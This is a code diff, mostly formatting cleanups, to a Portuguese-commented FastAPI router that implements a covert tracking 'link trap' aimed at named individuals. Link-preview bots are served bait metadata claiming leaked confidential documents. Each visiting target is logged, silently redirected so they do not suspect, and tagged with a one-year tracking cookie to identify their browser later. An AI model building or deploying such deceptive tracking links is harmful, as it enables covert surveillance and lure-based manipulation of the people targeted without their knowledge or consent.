@@ -1,9 +1,10 @@
+from datetime import datetime
+
 from fastapi import APIRouter, Request, Response
 from fastapi.responses import HTMLResponse, RedirectResponse
 from loguru import logger
-from datetime import datetime
 
-router = APIRouter( tags=['telemetry'])
+router = APIRouter(tags=['telemetry'])
 telemetry_logger = logger.bind(module='telemetry')
 
 # Simulação de DB em memória (usa Redis ou SQL na vida real, Boss)
@@ -11,6 +12,7 @@ TARGETS = {
     "hash_gabrielle": {"name": "Gabrielle", "redirect": "https://youtube.com/watch?v=dQw4w9WgXcQ"},
     "hash_chefe": {"name": "João Chefe", "redirect": "https://linkedin.com"}
 }
+
 
 @router.get("/v/{target_hash}")
 async def link_trap(target_hash: str, request: Request):
@@ -39,7 +41,7 @@ async def link_trap(target_hash: str, request: Request):
     if is_bot:
         # 3. MODO ISCA: O Bot recebe apenas os metadados para o preview bonito
         # O WhatsApp lê as tags <meta property="og:..."> para montar o card
-        html_content = f"""
+        html_content = """
         <html>
             <head>
                 <meta property="og:title" content="VAZOU: Documentos Confidenciais 2025">
@@ -63,13 +65,13 @@ async def link_trap(target_hash: str, request: Request):
         telemetry_logger.debug(f"Hora: {datetime.now()}\n")
         # Redireciona o alvo para o conteúdo real para ele não desconfiar
         response = RedirectResponse(url=target_data["redirect"])
-        
+
         # Planta o cookie para identificar este browser no futuro (mesmo em links genéricos)
         response.set_cookie(
-            key="tracking_id", 
-            value=target_hash, 
-            max_age=60*60*24*365, # 1 ano de rastreio, foda-se
+            key="tracking_id",
+            value=target_hash,
+            max_age=60 * 60 * 24 * 365,  # 1 ano de rastreio, foda-se
             httponly=True
         )
-        
+
         return response
